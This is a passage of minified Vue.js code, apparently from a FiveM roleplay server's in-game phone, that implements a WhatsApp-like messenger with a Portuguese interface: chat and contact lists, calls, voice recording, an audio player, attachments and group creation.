    groups: df,
    messages: pf,
    unread: ff,
    avatars: mf,
    async ready() {
        this.loaded = !0, await _o.backend.wpp_getProfile();
        const e = await _o.backend.wpp_getResume();
        e.groups.forEach((e => e.phone = "group" + e.id)), e.messages.forEach((e => e.other = gf(e)));
        for (let [t, n] of Object.entries(e)) Object.assign(this[t], n);
        _o.pusher.once("REFRESH", (() => {
            this.loaded = !1;
            for (let e of [this.groups, this.messages, this.unread, this.avatars])
                for (let t in e) delete e[t]
        })), this.loaded = !0
    }
};
const xf = {
        components: {
            Header: Hp,
            Footer: Wp,
            Settings: Yp
        },
        name: "WhatsApp",
        inject: ["setDark"],
        setup() {
            Qi();
            const e = _o.settings.isAndroid,
                t = da((() => _o.identity.phone)),
                n = rt("chats"),
                l = rt(""),
                a = rt(!1),
                s = rt(Ys("whatsapp")),
                o = rt([]),
                r = da((() => {
                    const e = l.value.toLowerCase();
                    return o.value.filter((t => e ? Bs(f(t)).toLowerCase().includes(e) || f(t).includes(e) : 1))
                })),
                {
                    groups: i,
                    messages: c,
                    unread: u,
                    avatars: d
                } = vf;
            _o.localhost && (r.value = [{
                initiator: "000-001",
                target: "000-002",
                status: "ok",
                callback: !0,
                duration: 30,
                created_at: Date.now() / 1e3
            }, {
                initiator: "000-001",
                target: "000-003",
                callback: !0,
                duration: 30,
                created_at: Date.now() / 1e3
            }, {
                initiator: "000-001",
                target: "000-004",
                callback: !0,
                duration: 30,
                created_at: Date.now() / 1e3
            }]);
            let p = 0;
            Rn(n, (e => {
                "calls" === e && p < Date.now() && (_o.backend.getPhoneCalls().then((e => {
                    o.value = e.map((e => (e.callback = e.initiator == t.value || !e.anonymous, e)))
                })), p = Date.now() + 5e3)
            }));
            const f = (e, t) => {
                var n, l;
                return t || (t = null != (n = e.target) ? n : e.target, e = null != (l = e.sender) ? l : e.initiator), e == _o.identity.phone ? t : e
            };

            function m(e) {
                const t = c.find((t => t.other === e));
                return {
                    id: e,
                    phone: e,
                    name: Bs(e),
                    avatarURL: d[e] || _o.asset("/stock/user.svg"),
                    message: t,
                    unread: u[null == t ? void 0 : t.channel_id] || 0
                }
            }
            const h = da((() => {
                const e = l.value.trim().toLowerCase(),
                    t = [];
                return "chats" === n.value ? (t.push(...c.filter((t => e ? Bs(t.other).toLowerCase().includes(e) || t.other.includes(e) : 1)).map((e => m(e.other)))), e ? (t.push(...i.filter((t => t.name.toLowerCase().includes(e)))), _o.contacts.value.forEach((n => {
                    t.some((e => e.phone == n.phone)) || (n.phone.includes(e) || n.name.toLowerCase().includes(e)) && t.push(m(n.phone))
                }))) : t.push(...i)) : "contacts" === n.value && _o.contacts.value.forEach((n => {
                    (n.phone.includes(e) || n.name.toLowerCase().includes(e)) && t.push(m(n.phone))
                })), t.sort(((e, t) => {
                    var n, l;
                    return (null == (n = t.message) ? void 0 : n.created_at) - (null == (l = e.message) ? void 0 : l.created_at)
                }))
            }));
            return vf.loaded || vf.ready(), {
                android: e,
                tab: n,
                appName: s,
                query: l,
                searching: a,
                conversations: h,
                calls: r,
                myPhone: t,
                contentDefaults: {
                    image: "📷 Foto",
                    location: "🌎 Localização",
                    audio: "🔊 Áudio"
                },
                onContext: async function(e) {
                    const t = await bo().request([
                        ["Excluir conversa", "text-red-500 self-center"], "g" != e.phone[0] && ["Efetuar ligação", "text-blue-500 self-center"]
                    ].filter((e => e)), 20);
                    0 === t ? _o.backend.wpp_deleteMessages(e.phone).then((() => {
                        $s(c, (t => t.other == e.phone))
                    })) : 1 === t && _o.pusher.emit("CALL_TO", e.phone)
                },
                other: f,
                createCall: function(e) {
                    _o.pusher.emit("CALL_TO", f(e), e.video)
                },
                getAvatar: function(e) {
                    var t;
                    return null != (t = d[e]) ? t : _o.asset("/stock/user.svg")
                }
            }
        },
        activated() {
            this.setDark(!!_o.settings.isAndroid || void 0)
        }
    },
    yf = sn("data-v-0faff89a");
ln("data-v-0faff89a");
const kf = {
        class: "font-bold ml-6"
    },
    wf = {
        key: 0,
        class: "far fa-search-minus text-3xl"
    },
    Cf = {
        key: 1,
        class: "far fa-search text-3xl"
    },
    _f = Pl("i", {
        class: "fas fa-users"
    }, null, -1),
    Af = Pl("i", {
        class: "fas fa-cog"
    }, null, -1),
    Sf = {
        class: "mt-4 h-16 bg-whatsapp text-white border-b border-theme grid grid-cols-3"
    },
    Rf = {
        key: 1,
        class: "p-3 pb-0"
    },
    Tf = {
        key: 2,
        class: "flex-1 overflow-y-auto hide-scroll p-5"
    },
    Ef = {
        key: 0,
        class: "mt-24"
    },
    Pf = {
        class: "text-5xl font-bold"
    },
    Lf = {
        class: "relative text-placeholder"
    },
    If = Pl("i", {
        class: "fas fa-search absolute left-2 top-3.5 text-xl"
    }, null, -1),
    Of = {
        class: "flex-1 flex flex-col justify-around text-xl ml-3 border-1 border-b border-theme pb-2"
    },
    Mf = {
        class: "flex items-center justify-between"
    },
    Vf = {
        class: "text-3xl text-theme"
    },
    Df = {
        key: 0,
        class: "text-gray-400"
    },
    Uf = {
        class: "flex justify-between"
    },
    Nf = {
        key: 0,
        class: "text-xl text-gray-400"
    },
    $f = {
        key: 1,
        class: "text-xl text-gray-500 italic"
    },
    jf = {
        key: 2,
        class: "text-xl text-gray-500 italic"
    },
    Ff = {
        key: 3,
        class: "bg-blue-500 text-white px-3 py-1 text-base rounded-full flex flex-center"
    },
    zf = {
        key: 0,
        class: "mt-24 mb-16"
    },
    Bf = Pl("h1", {
        class: "text-5xl font-bold"
    }, "Configurações", -1),
    Hf = {
        key: 4,
        class: "flex-1 overflow-y-auto hide-scroll p-5"
    },
    qf = {
        key: 0,
        class: "mt-24"
    },
    Gf = Pl("h1", {
        class: "text-5xl font-bold"
    }, "Chamadas", -1),
    Wf = {
        class: "text-theme"
    },
    Kf = {
        class: "flex flex-col ml-5 text-3xl"
    },
    Jf = {
        class: "font-semibold"
    },
    Xf = {
        class: "text-gray-400 text-xl pt-2"
    },
    Yf = {
        key: 0,
        class: "fas fa-video"
    },
    Zf = {
        key: 1,
        class: "fas fa-phone transform rotate-90"
    };
an();
const Qf = yf(((e, t, n, l, a, s) => {
    const o = dl("Header"),
        r = dl("app-input"),
        i = dl("Settings"),
        c = dl("Footer");
    return wl(), _l("div", {
        class: ["flex flex-col h-full", [l.android ? "bg-whatsapp-container" : "bg-theme text-theme"]]
    }, [l.android ? (wl(), _l(o, {
        key: 0
    }, {
        default: yf((() => [Pl("h1", kf, g(l.appName), 1), Pl("button", {
            onClick: t[1] || (t[1] = e => l.searching = !l.searching),
            class: "absolute top-16 right-32"
        }, [l.searching ? (wl(), _l("i", wf)) : (wl(), _l("i", Cf))]), Pl("button", {
            onClick: t[2] || (t[2] = t => e.$router.push("/whatsapp/create")),
            class: "absolute top-16 right-16"
        }, [_f]), Pl("button", {
            onClick: t[3] || (t[3] = e => l.tab = "settings"),
            class: "absolute top-16 right-4"
        }, [Af]), Pl("div", Sf, [(wl(), _l(bl, null, fa({
            chats: "CHATS",
            contacts: "CONTATOS",
            calls: "LIGAÇÕES"
        }, ((e, t) => Pl("button", {
            key: t,
            tab: "",
            class: ["font-bold text-xl", {
                active: l.tab === t
            }],
            onClick: e => l.tab = t
        }, g(e), 11, ["onClick"]))), 64))])])),
        _: 1
    })) : Ml("", !0), !l.searching || "chats" != l.tab && "contacts" != l.tab ? Ml("", !0) : (wl(), _l("div", Rf, [Pl(r, {
        modelValue: l.query,
        "onUpdate:modelValue": t[4] || (t[4] = e => l.query = e),
        spellcheck: "false",
        placeholder: "Nome do contato",
        class: "bg-transparent border text-theme text-xl"
    }, null, 8, ["modelValue"])])), "chats" == l.tab || "contacts" == l.tab ? (wl(), _l("div", Tf, [l.android ? Ml("", !0) : (wl(), _l("div", Ef, [Pl("h1", Pf, g("chats" == l.tab ? "Conversas" : "Contatos"), 1), Pl("div", Lf, [Zn(Pl("input", {
        "onUpdate:modelValue": t[5] || (t[5] = e => l.query = e),
        class: "bg-theme-accent w-full text-lg p-2.5 pl-8 rounded-lg",
        spellcheck: "false",
        placeholder: "Pesquisar"
    }, null, 512), [
        [ns, l.query]
    ]), If]), "chats" == l.tab ? (wl(), _l("h1", {
        key: 0,
        class: "text-right text-lightBlue-500 underline text-2xl mt-4",
        onClick: t[6] || (t[6] = t => e.$router.push("/whatsapp/create"))
    }, " Novo grupo ")) : Ml("", !0)])), Pl("ul", null, [(wl(!0), _l(bl, null, fa(l.conversations, (t => {
        var n, a;
        return wl(), _l("li", {
            onContextmenu: is((e => l.onContext(t)), ["prevent", "stop"]),
            key: t.id,
            onClick: n => e.$router.push("/whatsapp/" + t.phone),
            class: "flex mt-3"
        }, [Pl("img", {
            class: "border rounded-full w-24 h-24",
            src: t.avatarURL,
            alt: ""
        }, null, 8, ["src"]), Pl("div", Of, [Pl("div", Mf, [Pl("h2", Vf, g(t.name), 1), t.message ? (wl(), _l("span", Df, g(e.$filters.unixToHHMM(t.message.created_at)), 1)) : Ml("", !0)]), Pl("div", Uf, [t.message ? (wl(), _l("span", Nf, [t.message.sender == l.myPhone ? (wl(), _l("i", {
            key: 0,
            class: ["fal fa-check-double", {
                "text-blue-400": !!t.message.saw_at
            }]
        }, null, 2)) : Ml("", !0), Il(" " + g((null == (n = t.message.content) ? void 0 : n.match(/(http)?s?:?(\/\/[^"']*\.(?:webm))/)) ? l.contentDefaults.audio : (null == (a = t.message.content) ? void 0 : a.substr(0, 40)) || l.contentDefaults[t.message.image ? "image" : "location"]), 1)])) : t.phone != t.id ? (wl(), _l("span", $f, " Nenhuma mensagem... ")) : (wl(), _l("span", jf, " Clique para iniciar uma conversa ")), t.unread ? (wl(), _l("span", Ff, g(t.unread), 1)) : Ml("", !0)])])], 40, ["onContextmenu", "onClick"])
    })), 128))])])) : "settings" == l.tab ? (wl(), _l(i, {
        key: 3
    }, {
        default: yf((() => [l.android ? Ml("", !0) : (wl(), _l("div", zf, [Bf]))])),
        _: 1
    })) : (wl(), _l("div", Hf, [l.android ? Ml("", !0) : (wl(), _l("div", qf, [Gf])), Pl("ul", Wf, [(wl(!0), _l(bl, null, fa(l.calls, (t => (wl(), _l("li", {
        key: t.id,
        class: "border-b border-theme p-5 flex items-center"
    }, [Pl("img", {
        class: "w-20 h-20 rounded-full",
        src: l.getAvatar(t.callback && l.other(t))
    }, null, 8, ["src"]), Pl("div", Kf, [Pl("h1", Jf, g(t.callback ? e.$filters.getNameByPhone(l.other(t)) : "(Anônimo)"), 1), Pl("span", Xf, [Pl("i", {
        class: ["fal fa-long-arrow-left", {
            "text-red-500": "ok" != t.status,
            "text-green-500": "ok" == t.status,
            "transform -rotate-45": t.target == l.myPhone,
            "rotate-135": t.target != l.myPhone
        }]
    }, null, 2), Il(" " + g(e.$filters.unixToDayOfMonth(t.created_at)), 1)])]), t.callback ? (wl(), _l("button", {
        key: 0,
        class: ["ml-auto text-3xl", [l.android ? "text-whatsapp" : "text-blue-ios"]],
        onClick: e => t.callback && l.createCall(t)
    }, [t.video ? (wl(), _l("i", Yf)) : (wl(), _l("i", Zf))], 10, ["onClick"])) : Ml("", !0)])))), 128))])])), l.android ? Ml("", !0) : (wl(), _l(c, {
        key: 5,
        tab: l.tab,
        onChange: e => l.tab = e
    }, null, 8, ["tab", "onChange"]))], 2)
}));
xf.render = Qf, xf.__scopeId = "data-v-0faff89a";
const em = {
        props: ["src"],
        setup(e) {
            const t = Ze({
                    playing: !1,
                    duration: 0,
                    offset: 0
                }),
                n = new Audio;
            n.oncanplay = () => t.offset = 0, fetch(e.src).then((e => e.blob())).then((e => {
                n.src = URL.createObjectURL(e)
            })), n.ontimeupdate = () => {
                t.offset = n.currentTime
            }, n.ondurationchange = e => {
                e.target.duration != 1 / 0 && (t.duration = e.target.duration)
            }, n.addEventListener("ended", (() => {
                t.playing = !1
            }));
            const l = da((() => t.duration ? t.offset / t.duration * 95 : 0));
            return {
                state: t,
                resume: () => {
                    n.play(), t.playing = !0, t.offset >= t.duration && (n.currentTime = 0)
                },
                pause: () => {
                    n.pause(), t.playing = !1
                },
                percent: l
            }
        }
    },
    tm = {
        class: "relative flex items-center h-20 px-6 rounded-lg w-full"
    },
    nm = Pl("i", {
        class: "fas fa-play text-gray-400"
    }, null, -1),
    lm = Pl("i", {
        class: "fas fa-pause text-gray-400"
    }, null, -1),
    am = {
        class: "ml-4 flex-1 h-1 bg-gray-200"
    },
    sm = {
        class: "absolute bottom-0 right-4 text-theme text-lg"
    };
em.render = function(e, t, n, l, a, s) {
    return wl(), _l("div", tm, [l.state.playing ? (wl(), _l("button", {
        key: 1,
        onClick: t[2] || (t[2] = e => l.pause())
    }, [lm])) : (wl(), _l("button", {
        key: 0,
        onClick: t[1] || (t[1] = e => l.resume())
    }, [nm])), Pl("div", am, [Pl("div", {
        style: {
            width: l.percent + "%",
            backgroundColor: l.state.playing ? "#4ade80" : "#60a5fa",
            height: "0.25rem"
        }
    }, null, 4), Pl("div", {
        style: {
            left: l.percent + "%",
            backgroundColor: l.state.playing ? "#4ade80" : "#60a5fa"
        },
        class: "relative bottom-3 rounded-full w-5 h-5 bg-blue-400"
    }, null, 4)]), Pl("span", sm, g(e.$filters.duration(l.state.duration)), 1)])
};
const om = {
        components: {
            AudioPlayer: em,
            Header: Hp
        },
        setup() {
            jl("setDark")(!!_o.settings.isAndroid || null);
            const e = ec(),
                t = _o.identity.phone,
                n = jl("alert"),
                l = jl("prompt"),
                a = jl("useImageFocus"),
                s = rt(""),
                o = rt([]),
                r = rt([0, 0, 0]),
                i = Ze({}),
                c = rt(null),
                u = rt(!!_o.settings.videoServer),
                d = e.params.contact,
                p = rt(_o.contacts.value.find((e => e.phone === d)));

            function f(e) {
                return e.location && (e.location = JSON.parse(e.location)), e
            }
            p.value || (d.startsWith("group") ? p.value = {
                id: d,
                isGroup: !0
            } : p.value = {
                name: d,
                unknown: !0,
                avatarURL: _o.asset("/stock/user.svg")
            }), _o.getPlayerCoords().then((e => r.value = e)), _o.backend.wpp_getChat(d).then((e => {
                p.value.id = e.id, e.name && (p.value.name = e.name), p.value.avatarURL = e.avatarURL || _o.asset("/stock/user.svg"), o.value = e.messages.map(f), Lt((() => h(!0)))
            }));
            let m = 0;

            function h(e, t) {
                var n;
                !0 !== e && s.value || (null == (n = document.querySelector(".overflow-y-auto")) || n.scrollTo(0, 9e6), p.value.id < 1e9 && !t && m < Date.now() && (m = Date.now() + 1e3, _o.backend.wpp_markAsRead(d), _o.pusher.emit("WHATSAPP_READED", p.value.id)))
            }
            async function b(e = "text", t) {
                const a = [d, (t || s.value).trim(), e];
                if ("location" === e) a.push(await _o.getPlayerCoords());
                else if ("camera" === e) try {
                    a[2] = "image", a.push(await io().request(!1, "/whatsapp"))
                } catch (o) {
                    return
                } else if ("gallery" === e) try {
                    a[2] = "image", a.push(await po())
                } catch (o) {
                    return
                } else if ("image" === e) {
                    const e = await l("Insira o link da imagem");
                    if (!e) return;
                    if (!e.match(/(http)?s?:?(\/\/[^"']*\.(?:png|jpg|jpeg|gif|png|svg))/)) return n("Link inválido");
                    a.push(e)
                } else if (!a[1]) return;
                _o.backend.wpp_sendMessage(...a).then((e => {
                    e.error && n(e.error)
                })), s.value = "", delete i.attachments
            }

            function g(e) {
                e.channel_id == p.value.id && (o.value.push(f(e)), Lt((() => h(!1, e.sender == t))))
            }
            _o.onceRoute("WHATSAPP_MESSAGE", g), _o.onceRoute("WHATSAPP_READ", (e => {
                e === d && o.value.forEach((e => {
                    e.sender == t && (e.saw_at = Math.floor(Date.now() / 1e3))
                }))
            }));
            const v = ["#ef5350", "#EC407A", "#AB47BC", "#7E57C2", "#5C6BC0", "#42A5F5", "#26C6DA", "#26A69A", "#66BB6A", "#9CCC65", "#FF7043"];
            return {
                prompt: l,
                chat: p,
                myPhone: t,
                messages: o,
                addMessage: b,
                handleMessage: g,
                ajustSize: h,
                updateGPS: function(e) {
                    _o.pusher.emit("GPS", {
                        location: e
                    })
                },
                location: r,
                text: s,
                recording: c,
                startRecording: function() {
                    if (!_o.microphone.value) return _o.captureMicrophone(), n("A autorização do microfone não foi concedida.");
                    const e = new MediaRecorder(_o.microphone.value, {
                            audioBitsPerSecond: 16e3
                        }),
                        t = setInterval((() => {
                            if (!c.value) return clearInterval(t);
                            c.value.duration += 1
                        }), 1e3);
                    e.start(), c.value = {
                        duration: 0,
                        recorder: e,
                        stop(t = !1) {
                            c.value = null, t && (e.ondataavailable = e => eo.upload(e.data, "webm").then((e => {
                                b("audio", e)
                            }), (() => n("Falha ao salvar áudio")))), e.stop()
                        }
                    }
                },
                getColorForPhone: function(e) {
                    let t = parseInt(e.replace(/-/g, ""));
                    return v[t % v.length]
                },
                saveContact: async function() {
                    var e;
                    const t = null == (e = await l("Nome do contato")) ? void 0 : e.trim();
                    if (t) return t.length > 128 ? n("Nome inválido") : void _o.backend.addContact(d, t).then((e => {
                        e instanceof Object && (p.value.name = t, delete p.value.unknown, _o.contacts.value.push(e), _o.pusher.emit("ADD_CONTACT", e))
                    }))
                },
                misc: i,
                isExternalLink: function(e) {
                    if ("true" != _o.storage.get("whatsapp-sensitive")) return !1;
                    const t = _o.settings.uploadServer;
                    return !e.startsWith(t.substring(0, t.indexOf("/", 10)))
                },
                addAttachment: function() {
                    const e = ["camera", "gallery", "location"];
                    _o.settings.allowUnsafeURL && e.splice(2, 0, "image"), bo().request([
                        ["Câmera", "text-blue-500 self-center"],
                        ["Galeria", "text-blue-500 self-center"], _o.settings.allowUnsafeURL && ["Imagem", "text-blue-500 self-center"],
                        ["Localização", "text-blue-500 self-center"]
                    ], 30).then((t => e[t] && b(e[t])))
                },
                onContextImage: async function(e) {
                    const t = await bo().request([
                        ["Ver imagem", "text-blue-500 self-center"],
                        ["Salvar imagem", "text-blue-500 self-center"]
                    ], 20);
                    if (0 === t) a(e);
                    else if (1 === t) {
                        if (_o.gallery.some((t => t.url == e))) return n("Esta imagem já está salva");
                        _o.backend.gallery_save("/downloads", e).then((e => {
                            _o.gallery.push(e), _o.gallery.sort(((e, t) => t.id - e.id))
                        }))
                    }
                },
                createCall: function(e = !1) {
                    _o.pusher.emit("CALL_TO", d, e)
                },
                hasVideoCall: u,
                android: _o.settings.isAndroid
            }
        },
        unmounted() {
            var e;
            null == (e = this.recording) || e.stop()
        }
    },
    rm = sn("data-v-155782fe");
ln("data-v-155782fe");
const im = {
        class: "flex flex-col h-full text-theme",
        container: ""
    },
    cm = {
        class: "h-16"
    },
    um = Pl("i", {
        class: "far fa-arrow-left text-3xl"
    }, null, -1),
    dm = Pl("i", {
        class: "fas fa-user-plus pl-3 text-2xl"
    }, null, -1),
    pm = {
        key: 0,
        class: "absolute top-16 right-0"
    },
    fm = Pl("i", {
        class: "fas fa-video text-2xl"
    }, null, -1),
    mm = Pl("i", {
        class: "fas fa-phone transform rotate-90 text-2xl"
    }, null, -1),
    hm = {
        key: 1,
        class: "h-28 bg-theme-accent flex items-center pt-14 pb-2 px-5 border-b border-theme"
    },
    bm = Pl("i", {
        class: "cupertino-icons text-blue-ios"
    }, "chevron_back", -1),
    gm = Pl("i", {
        class: "fas fa-user-plus pl-3 text-2xl text-blue-ios"
    }, null, -1),
    vm = {
        key: 0,
        class: "ml-auto mr-4"
    },
    xm = Pl("i", {
        class: "fal fa-video text-blue-ios text-4xl"
    }, null, -1),
    ym = Pl("i", {
        class: "cupertino-icons text-4xl text-blue-ios"
    }, "phone", -1),
    km = {
        class: "flex-1 overflow-y-auto hide-scroll p-5 relative"
    },
    wm = {
        key: 1
    },
    Cm = {
        class: "text-xl w-full flex justify-between "
    },
    _m = Pl("b", null, "Clique para atualizar seu GPS", -1),
    Am = {
        class: "break-words"
    },
    Sm = {
        class: "flex-shrink-0 absolute right-3 bottom-1 flex items-center text-base text-gray-400"
    },
    Rm = {
        key: 2,
        class: "absolute right-8 bottom-28 bg-theme text-theme w-40 py-2 px-4 rounded-full flex justify-between"
    },
    Tm = {
        class: "blink"
    },
    Em = Pl("i", {
        class: "far fa-trash-alt text-red-500"
    }, null, -1),
    Pm = {
        key: 3,
        class: "h-24 flex items-center justify-around px-4"
    },
    Lm = Pl("i", {
        class: "far fa-paperclip text-3xl"
    }, null, -1),
    Im = {
        key: 0,
        xmlns: "http://www.w3.org/2000/svg",
        "enable-background": "new 0 0 24 24",
        height: "2.4rem",
        viewBox: "0 0 24 24",
        width: "2.4rem",
        fill: "#fff"
    },
    Om = Pl("g", null, [Pl("rect", {
        fill: "none",
        height: "24",
        width: "24"
    }), Pl("rect", {
        fill: "none",
        height: "24",
        width: "24"
    }), Pl("rect", {
        fill: "none",
        height: "24",
        width: "24"
    })], -1),
    Mm = Pl("g", null, [Pl("g"), Pl("g", null, [Pl("path", {
        d: "M12,14c1.66,0,3-1.34,3-3V5c0-1.66-1.34-3-3-3S9,3.34,9,5v6C9,12.66,10.34,14,12,14z"
    }), Pl("path", {
        d: "M17,11c0,2.76-2.24,5-5,5s-5-2.24-5-5H5c0,3.53,2.61,6.43,6,6.92V21h2v-3.08c3.39-0.49,6-3.39,6-6.92H17z"
    })])], -1),
    Vm = {
        key: 1,
        class: "fa fa-square text-3xl"
    },
    Dm = {
        key: 4,
        class: "h-20 flex items-center px-10 bg-theme-accent"
    },
    Um = Pl("i", {
        class: "fal fa-plus text-4xl text-blue-ios"
    }, null, -1),
    Nm = {
        key: 0,
        class: "fa fa-square text-red-500 text-3xl"
    },
    $m = {
        key: 1,
        class: "fal fa-microphone text-blue-ios"
    };
an();
const jm = rm(((e, t, n, l, a, s) => {
    var o, r, i;
    const c = dl("Header"),
        u = dl("AudioPlayer");
    return wl(), _l("div", im, [l.android ? (wl(), _l(c, {
        key: 0
    }, {
        default: rm((() => {
            var n, a;
            return [Pl("div", cm, [Pl("button", {
                onClick: t[1] || (t[1] = (...t) => e.$router.back && e.$router.back(...t)),
                class: "absolute top-16 left-4"
            }, [um]), Pl("img", {
                onClick: t[2] || (t[2] = t => l.chat.isGroup && e.$router.push("/whatsapp/edit/" + l.chat.id)),
                class: "absolute top-16 left-14 w-12 h-12 rounded-full",
                src: null != (n = l.chat.avatarURL) ? n : e.$asset("/stock/user.svg")
            }, null, 8, ["src"]), Pl("h1", {
                class: "ml-28 font-bold",
                onClick: t[4] || (t[4] = t => l.chat.isGroup && e.$router.push("/whatsapp/edit/" + l.chat.id))
            }, [Il(g(null == (a = l.chat.name) ? void 0 : a.slice(0, 20)) + " ", 1), l.chat.unknown ? (wl(), _l("button", {
                key: 0,
                onClick: t[3] || (t[3] = (...e) => l.saveContact && l.saveContact(...e))
            }, [dm])) : Ml("", !0)]), l.chat.isGroup ? Ml("", !0) : (wl(), _l("div", pm, [l.hasVideoCall ? (wl(), _l("button", {
                key: 0,
                onClick: t[5] || (t[5] = e => l.createCall(!0)),
                class: "mr-8"
            }, [fm])) : Ml("", !0), Pl("button", {
                onClick: t[6] || (t[6] = e => l.createCall()),
                class: "mr-8"
            }, [mm])]))])]
        })),
        _: 1
    })) : (wl(), _l("div", hm, [Pl("button", {
        onClick: t[7] || (t[7] = (...t) => e.$router.back && e.$router.back(...t))
    }, [bm]), Pl("img", {
        class: "ml-14 w-12 h-12 rounded-full",
        src: null != (o = l.chat.avatarURL) ? o : e.$asset("/stock/user.svg")
    }, null, 8, ["src"]), Pl("h1", {
        class: "ml-4 font-bold text-3xl text-theme",
        onClick: t[9] || (t[9] = t => l.chat.isGroup && e.$router.push("/whatsapp/edit/" + l.chat.id))
    }, [Il(g(null == (i = null == (r = l.chat.name) ? void 0 : r.slice) ? void 0 : i.call(r, 0, 20)) + " ", 1), l.chat.unknown ? (wl(), _l("button", {
        key: 0,
        onClick: t[8] || (t[8] = (...e) => l.saveContact && l.saveContact(...e))
    }, [gm])) : Ml("", !0)]), l.chat.isGroup ? Ml("", !0) : (wl(), _l("div", vm, [l.hasVideoCall ? (wl(), _l("button", {
        key: 0,
        onClick: t[10] || (t[10] = e => l.createCall(!0)),
        class: "mr-10"
    }, [xm])) : Ml("", !0), Pl("button", {
        onClick: t[11] || (t[11] = e => l.createCall())
    }, [ym])]))])), Pl("div", km, [(wl(!0), _l(bl, null, fa(l.messages, (n => (wl(), _l("div", {
        class: "flex",
        key: n.id
    }, [Pl("div", {
        class: ["max-w-10/12 mt-2 p-4 pb-8 rounded-xl relative", {
            "w-10/12": e.$filters.isAudio(n.content),
            "bg-sender ml-auto": n.sender == l.myPhone,
            "bg-target mr-auto": n.sender != l.myPhone
        }]
    }, [n.channel_id > 1e9 && n.sender != l.myPhone ? (wl(), _l("h1", {
        key: 0,
        class: "mb-1 text-xl",
        style: {
            color: l.getColorForPhone(n.sender)
        }
    }, g(e.$filters.getNameByPhone(n.sender)), 5)) : Ml("", !0), n.image ? (wl(), _l("div", wm, [Pl("img", {
        onContextmenu: is((e => l.onContextImage(n.image)), ["prevent", "stop"]),
        class: ["w-full rounded-lg", {
            censored: l.isExternalLink(n.image)
        }],
        onLoad: t[12] || (t[12] = (...e) => l.ajustSize && l.ajustSize(...e)),
        src: n.image,
        tabindex: "0"
    }, null, 42, ["onContextmenu", "src"])])) : n.location ? (wl(), _l("div", {
        key: 2,
        class: "flex flex-col items-center",
        onClick: e => l.updateGPS(n.location)
    }, [Pl("img", {
        class: "border rounded-lg",
        onLoad: t[13] || (t[13] = (...e) => l.ajustSize && l.ajustSize(...e)),
        src: "https://fivem.jesteriruka.dev/stock/maps.jpg",
        alt: ""
    }, null, 32), Pl("div", Cm, [_m, Pl("span", null, g(e.$filters.vdist2(l.location, n.location)), 1)])], 8, ["onClick"])) : Ml("", !0), e.$filters.isAudio(n.content) ? (wl(), _l(u, {
        key: 3,
        src: n.content
    }, null, 8, ["src"])) : Ml("", !0), Pl("div", null, [Pl("span", Am, g(e.$filters.isAudio(n.content) ? "" : n.content), 1), Pl("span", Sm, [Il(g(e.$filters.unixToHHMM(n.created_at)) + " ", 1), n.sender == l.myPhone ? (wl(), _l("i", {
        key: 0,
        class: ["fal fa-check-double pl-2", {
            "text-blue-400": n.saw_at
        }]
    }, null, 2)) : Ml("", !0)])])], 2)])))), 128))]), l.recording ? (wl(), _l("div", Rm, [Pl("span", Tm, g(e.$filters.duration(l.recording.duration)), 1), Pl("button", {
        onClick: t[14] || (t[14] = e => l.recording.stop())
    }, [Em])])) : Ml("", !0), l.android ? (wl(), _l("div", Pm, [Zn(Pl("input", {
        android: "",
        type: "text",
        onKeydown: t[15] || (t[15] = us((e => l.addMessage()), ["enter"])),
        "onUpdate:modelValue": t[16] || (t[16] = e => l.text = e),
        placeholder: "Envie uma mensagem",
        class: "flex-1 p-3.5 px-4 pr-14 text-2xl text-theme rounded-full"
    }, null, 544), [
        [ns, l.text]
    ]), Pl("button", {
        class: "absolute right-28",
        onClick: t[17] || (t[17] = e => l.addAttachment())
    }, [Lm]), Pl("button", {
        class: "flex flex-center ml-2 w-16 h-16 microphone",
        onClick: t[18] || (t[18] = e => l.recording ? l.recording.stop(!0) : l.startRecording())
    }, [l.recording ? (wl(), _l("i", Vm)) : (wl(), _l("svg", Im, [Om, Mm]))])])) : (wl(), _l("div", Dm, [Pl("button", {
        onClick: t[19] || (t[19] = (...e) => l.addAttachment && l.addAttachment(...e))
    }, [Um]), Zn(Pl("input", {
        onKeydown: t[20] || (t[20] = us((e => l.addMessage()), ["enter"])),
        "onUpdate:modelValue": t[21] || (t[21] = e => l.text = e),
        class: "ml-4 bg-theme rounded-3xl bg-theme border border-theme w-full p-2 px-4 text-2xl text-theme"
    }, null, 544), [
        [ns, l.text]
    ]), Pl("button", {
        class: "ml-5",
        onClick: t[22] || (t[22] = e => l.recording ? l.recording.stop(!0) : l.startRecording())
    }, [l.recording ? (wl(), _l("i", Nm)) : (wl(), _l("i", $m))])]))])
}));
om.render = jm, om.__scopeId = "data-v-155782fe";
const Fm = rt("https://fivem.jesteriruka.dev/stock/user.svg"),
    zm = rt(""),
    Bm = Ze([_o.identity.phone]),
    Hm = {
        components: {
            Header: Hp
        },
        setup() {
            jl("setDark")(!!_o.settings.isAndroid || null);
            const e = _o.settings.isAndroid,
                t = jl("prompt"),
                n = jl("alert"),
                l = Qi(),
                a = rt(!0),
                s = da((() => _o.contacts.value.filter((e => !Bm.includes(e.phone)))));
            return {
                android: e,
                dark: _o.darkTheme,
                avatarURL: Fm,
                name: zm,
                contacts: s,
                invited: Bm,
                removeMember: function(e) {
                    Bm.splice(Bm.indexOf(e), 1)
                },
                promptAvatarURL: async function() {
                    try {
                        const e = await bo().request(["Link externo", "Galeria"], 20, !0);
                        let l = await (e ? po() : t("Insira o link"));
                        if ((null == l ? void 0 : l.length) > 255) n("Link muito grande, máximo de 255 caracteres");
                        else if (l) {
                            Fm.value = l;
                            const e = new Image;
                            e.onload = () => a.value = !0, e.src = l
                        }
                    } catch (e) {}
                },
                submit: function() {
                    var e;
                    if (!a.value) return n("Imagem inválida");
                    if (Fm.value.length > 255) return n("Imagem muito grande");
                    if (!(null == (e = zm.value) ? void 0 : e.trim()) || zm.value.length > 32) return n("Nome inválido");
                    if (Bm.length < 2) return n("Usuários insuficientes");
                    const t = Bm.filter(((e, t) => t));
                    _o.backend.wpp_createGroup(zm.value.trim(), Fm.value, t).then((() => {
                        l.back()
                    })), Fm.value = "https://fivem.jesteriruka.dev/stock/user.svg", zm.value = "", Bm.length = 0, Bm.push(_o.identity.phone)
                }
            }
        }
    },
    qm = sn("data-v-007e0956");
ln("data-v-007e0956");
const Gm = {
        class: "h-16"
    },
    Wm = Pl("i", {
        class: "far fa-arrow-left"
    }, null, -1),
    Km = Pl("h1", {
        class: "absolute left-16 font-bold"
    }, "Criar Grupo", -1),
    Jm = {
        key: 1,
        class: "mt-24 mb-8 px-5"
    },
    Xm = Pl("h1", {
        class: "text-5xl font-bold"
    }, "Criar Grupo", -1),
